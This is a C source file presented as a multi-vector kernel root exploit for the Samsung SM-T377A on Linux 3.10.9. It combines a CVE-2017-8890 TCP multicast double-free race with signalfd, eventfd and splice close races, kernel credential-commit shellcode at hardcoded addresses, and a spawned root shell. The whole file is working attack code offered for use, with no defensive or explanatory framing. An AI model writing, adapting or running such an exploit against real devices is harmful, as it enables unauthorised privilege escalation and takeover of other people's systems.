/*
 * multi_root.c — Multi-vector kernel exploit for SM-T377A
 *
 * Combines several attack strategies in one binary:
 *
 * Vector 1: CVE-2017-8890 TCP inet_csk_clone_lock double-free
 * Vector 2: signalfd + epoll close race (UAF in wait_queue)
 * Vector 3: eventfd + epoll close race
 * Vector 4: socketpair + splice + close race
 *
 * Kernel 3.10.9, No KASLR/PXN/canaries/HARDENED_USERCOPY
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/signalfd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/filter.h>

#define COMMIT_CREDS        0xC0054328
#define PREPARE_KERNEL_CRED 0xC00548E0

typedef unsigned long (*commit_creds_fn)(unsigned long);
typedef unsigned long (*prepare_kernel_cred_fn)(unsigned long);
static volatile int g_got_root = 0;

static void __attribute__((noinline, optimize("O0")))
kernel_shellcode(void) {
    prepare_kernel_cred_fn pkc = (prepare_kernel_cred_fn)PREPARE_KERNEL_CRED;
    unsigned long new_cred = pkc(0);
    if (new_cred) {
        commit_creds_fn cc = (commit_creds_fn)COMMIT_CREDS;
        cc(new_cred);
        g_got_root = 1;
    }
}

/* ===== Vector 1: CVE-2017-8890 TCP accept + IP_DROP_MEMBERSHIP ===== */

static volatile int tcp_running = 1;

static void *tcp_accepter(void *arg) {
    int lsock = *(int*)arg;
    while (tcp_running) {
        struct sockaddr_in ca;
        socklen_t cl = sizeof(ca);
        int c = accept(lsock, (struct sockaddr*)&ca, &cl);
        if (c >= 0) close(c);
    }
    return NULL;
}

static void *tcp_connector(void *arg) {
    int port = *(int*)arg;
    while (tcp_running) {
        int s = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
        if (s < 0) continue;
        struct sockaddr_in a = {
            .sin_family = AF_INET, .sin_port = htons(port),
            .sin_addr.s_addr = htonl(INADDR_LOOPBACK)
        };
        connect(s, (struct sockaddr*)&a, sizeof(a));
        usleep(50);
        close(s);
    }
    return NULL;
}

static void *tcp_mc_dropper(void *arg) {
    int lsock = *(int*)arg;
    struct ip_mreq mreq;
    mreq.imr_multiaddr.s_addr = inet_addr("239.0.0.1");
    mreq.imr_interface.s_addr = htonl(INADDR_ANY);
    while (tcp_running) {
        setsockopt(lsock, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq));
        usleep(5);
        setsockopt(lsock, IPPROTO_IP, IP_DROP_MEMBERSHIP, &mreq, sizeof(mreq));
        usleep(5);
    }
    return NULL;
}

static void run_tcp_mc_race(int duration) {
    printf("[*] V1: CVE-2017-8890 TCP accept + multicast race (%ds)\n", duration);
    int port = 32000 + (rand() % 1000);
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0) { printf("[-] socket: %s\n", strerror(errno)); return; }
    int v = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &v, sizeof(v));
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(port),
                             .sin_addr.s_addr = htonl(INADDR_LOOPBACK) };
    if (bind(ls, (struct sockaddr*)&a, sizeof(a)) < 0 || listen(ls, 128) < 0) {
        printf("[-] bind/listen: %s\n", strerror(errno)); close(ls); return;
    }
    tcp_running = 1;
    pthread_t t1, t2, t3;
    pthread_create(&t1, NULL, tcp_accepter, &ls);
    pthread_create(&t2, NULL, tcp_connector, &port);
    pthread_create(&t3, NULL, tcp_mc_dropper, &ls);
    time_t s = time(NULL);
    while ((time(NULL) - s) < duration && !g_got_root) {
        sleep(2);
        printf("  [tcp-mc] %lds uid=%d\n", time(NULL)-s, getuid());
        if (getuid() == 0) break;
    }
    tcp_running = 0;
    int tmp = socket(AF_INET, SOCK_STREAM, 0);
    if (tmp >= 0) { connect(tmp, (struct sockaddr*)&a, sizeof(a)); close(tmp); }
    pthread_join(t1, NULL); pthread_join(t2, NULL); pthread_join(t3, NULL);
    close(ls);
    printf("  [tcp-mc] done uid=%d\n\n", getuid());
}

/* ===== Vector 2: signalfd + epoll close race ===== */

static volatile int sig_running = 1;

static void *sig_closer(void *arg) {
    int epfd = *(int*)arg;
    sigset_t mask;
    sigemptyset(&mask);
    sigaddset(&mask, SIGUSR1);
    while (sig_running) {
        int sfd = signalfd(-1, &mask, SFD_NONBLOCK);
        if (sfd < 0) continue;
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = sfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, sfd, &ev);
        close(sfd); /* race: free signalfd_ctx while epoll holds wait_queue ref */
    }
    return NULL;
}

static void *epoll_waiter(void *arg) {
    int epfd = *(int*)arg;
    struct epoll_event events[16];
    while (sig_running) {
        epoll_wait(epfd, events, 16, 1);
    }
    return NULL;
}

static void run_signalfd_race(int duration) {
    printf("[*] V2: signalfd + epoll close race (%ds)\n", duration);
    int epfd = epoll_create1(0);
    if (epfd < 0) { printf("[-] epoll: %s\n", strerror(errno)); return; }
    sig_running = 1;
    pthread_t c[3], w[3];
    for (int i = 0; i < 3; i++) {
        pthread_create(&c[i], NULL, sig_closer, &epfd);
        pthread_create(&w[i], NULL, epoll_waiter, &epfd);
    }
    time_t s = time(NULL);
    while ((time(NULL) - s) < duration && !g_got_root) {
        kill(getpid(), SIGUSR1);
        usleep(50);
        if ((time(NULL)-s) % 5 == 0 && (time(NULL)-s) > 0)
            printf("  [sigfd] %lds uid=%d\n", time(NULL)-s, getuid());
        if (getuid() == 0) break;
    }
    sig_running = 0;
    for (int i = 0; i < 3; i++) { pthread_join(c[i], NULL); pthread_join(w[i], NULL); }
    close(epfd);
    printf("  [sigfd] done uid=%d\n\n", getuid());
}

/* ===== Vector 3: eventfd + epoll close race ===== */

static volatile int evt_running = 1;

static void *evt_closer(void *arg) {
    int epfd = *(int*)arg;
    while (evt_running) {
        int efd = eventfd(0, EFD_NONBLOCK);
        if (efd < 0) continue;
        struct epoll_event ev = { .events = EPOLLIN|EPOLLOUT, .data.fd = efd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, efd, &ev);
        close(efd);
    }
    return NULL;
}

static void run_eventfd_race(int duration) {
    printf("[*] V3: eventfd + epoll close race (%ds)\n", duration);
    int epfd = epoll_create1(0);
    if (epfd < 0) return;
    evt_running = 1;
    pthread_t c[3], w[2];
    for (int i = 0; i < 3; i++) pthread_create(&c[i], NULL, evt_closer, &epfd);
    for (int i = 0; i < 2; i++) pthread_create(&w[i], NULL, epoll_waiter, &epfd);
    time_t s = time(NULL);
    while ((time(NULL) - s) < duration && !g_got_root) {
        sleep(2);
        printf("  [evtfd] %lds uid=%d\n", time(NULL)-s, getuid());
        if (getuid() == 0) break;
    }
    evt_running = 0;
    for (int i = 0; i < 3; i++) pthread_join(c[i], NULL);
    for (int i = 0; i < 2; i++) pthread_join(w[i], NULL);
    close(epfd);
    printf("  [evtfd] done uid=%d\n\n", getuid());
}

/* ===== Vector 4: socketpair + splice + close race ===== */

static volatile int spl_running = 1;

static void *splice_racer(void *arg) {
    while (spl_running) {
        int sv[2], pfd[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) continue;
        if (pipe(pfd) < 0) { close(sv[0]); close(sv[1]); continue; }
        char buf[4096];
        memset(buf, 'X', sizeof(buf));
        write(sv[0], buf, sizeof(buf));
        pid_t p = fork();
        if (p == 0) {
            splice(sv[1], NULL, pfd[1], NULL, 4096, SPLICE_F_NONBLOCK|SPLICE_F_MOVE);
            _exit(0);
        } else if (p > 0) {
            close(sv[1]); /* race with splice */
            waitpid(p, NULL, 0);
        }
        close(sv[0]); close(pfd[0]); close(pfd[1]);
    }
    return NULL;
}

static void run_splice_race(int duration) {
    printf("[*] V4: socketpair + splice + close race (%ds)\n", duration);
    spl_running = 1;
    pthread_t t[2];
    for (int i = 0; i < 2; i++) pthread_create(&t[i], NULL, splice_racer, NULL);
    time_t s = time(NULL);
    while ((time(NULL) - s) < duration && !g_got_root) {
        sleep(2);
        printf("  [splice] %lds uid=%d\n", time(NULL)-s, getuid());
        if (getuid() == 0) break;
    }
    spl_running = 0;
    for (int i = 0; i < 2; i++) pthread_join(t[i], NULL);
    printf("  [splice] done uid=%d\n\n", getuid());
}

int main(int argc, char **argv) {
    int dur = 30;
    if (argc > 1) dur = atoi(argv[1]);
    printf("=== Multi-Vector Root Exploit ===\n");
    printf("[*] SM-T377A, 3.10.9, no KASLR/PXN/canaries\n");
    printf("[*] Shellcode: %p, dur_each: %ds\n\n", kernel_shellcode, dur);
    unsigned long p = (unsigned long)kernel_shellcode & ~0xFFF;
    mprotect((void*)p, 4096, PROT_READ|PROT_WRITE|PROT_EXEC);
    sigset_t m; sigemptyset(&m); sigaddset(&m, SIGUSR1);
    sigprocmask(SIG_BLOCK, &m, NULL);

    pid_t c = fork();
    if (c == 0) {
        alarm(dur * 5 + 30); signal(SIGALRM, SIG_DFL);
        run_tcp_mc_race(dur);
        if (g_got_root || getuid() == 0) goto win;
        run_signalfd_race(dur);
        if (g_got_root || getuid() == 0) goto win;
        run_eventfd_race(dur);
        if (g_got_root || getuid() == 0) goto win;
        run_splice_race(dur);
        if (g_got_root || getuid() == 0) goto win;
        printf("\n=== All vectors exhausted, uid=%d ===\n", getuid());
        _exit(1);
    win:
        printf("[!] *** GOT ROOT! uid=%d ***\n", getuid());
        execl("/system/bin/sh", "sh", NULL);
        _exit(0);
    } else if (c > 0) {
        int st; waitpid(c, &st, 0);
        if (WIFEXITED(st)) printf("[*] Exit: %d\n", WEXITSTATUS(st));
        else if (WIFSIGNALED(st)) printf("[!] SIGNAL: %d (CRASH!)\n", WTERMSIG(st));
    }
    return 0;
}
